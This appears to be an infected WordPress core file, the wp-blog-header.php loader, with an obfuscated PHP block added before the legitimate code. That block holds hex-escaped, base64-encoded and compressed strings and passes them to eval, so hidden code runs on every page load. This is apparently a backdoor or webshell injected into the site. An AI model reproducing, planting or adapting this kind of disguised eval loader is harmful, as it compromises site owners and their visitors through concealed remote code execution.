<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "\x3d\x3d\x41I1\x638pn6\x43e\x6181J5ev\x62h0wQF8vvxefpX9z/ostZhXQZ9SuG8ruLEwTOzjgUmSeOH\x427RlE44gMvkYmZwO\x63hq4uiLO9I\x414gDf\x43qDPPJ0ZP024nh\x42VjiDDNZoZqFX\x62IFfYt9rnD0R/DqXw4YjgZhG2j5M/1VTJ1\x418nd49\x43\x42tlDxp5T8ILo5\x42dzPnMdJZzS\x62tzuVf\x618rdmVo6rSMD\x43G/0\x2bUW3RS\x62NMSmR2iSMRwNLZl/pMfMZGwUu8\x63FKTFMxdxqU1V0Q\x62hFde\x4265xJZphVWlysuefT0f1JtIznkkvrrX3P3SLjySjeinJ\x61h4POqU\x610ZhehFYOsqjx\x43s0iKJK\x2b\x41P6\x42MyeQjp/oepEPmmuEOlifXrNNTP\x62\x42pK46WPsSe\x61ZTU\x63ujGL5fpSUxttU\x43vWYiZ4sS\x2bmTRtYNE\x43dojFyRG0LKJq\x63\x41XyVJh5YYHq\x61R9pQUUZJpz5665mhNLsdEEWXX3n87WXL/lp44j81d\x62\x4130wtw9M2XG9EE/k/1sNF/19\x613eI7HWqILdIDZgT/n9u4PuMPr8y4ng5STX/hMSTQnH9ZXTyvG1\x2b6Qf3u\x63ydlyvxoXJoNoP\x43\x62VqTiv8\x61E7\x42f\x2bhj1lynlVJRt\x43MUOtLn\x435d466DiWMzFM6YRU\x63H1\x42fRF\x2bdoKFrxlzldL5tz570j/l\x42Lp3\x43T\x2b89rz360F3lHRR\x2b/g3EfUh5lW\x61\x42QXzPkV\x41g3wUg\x42NqyU4SoPtT9QnSqVYoRPG6QsMYDkSe\x6175JlTRjS6Ggven\x43R0/Tnzv7yefPxSXZL\x2bwg\x43PluL7/fdS7JJ9\x61SVW\x623yspIEqPUYimqNVQp\x41uurUhZPUQikkhExw/nmP9D\x42M\x62/07U1\x62/iKQX\x42wJe9fp\x41oFQ/SKQ\x62\x42wJe9fo\x414FQ/\x43KQf\x42wJe9fn\x41IGQ/yJQj\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
?>
<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

        $wp_did_header = true;

        // Load the WordPress library.
        require_once __DIR__ . '/wp-load.php';

        // Set up the WordPress query.
        wp();

        // Load the theme template.
        require_once ABSPATH . WPINC . '/template-loader.php';

}
?>
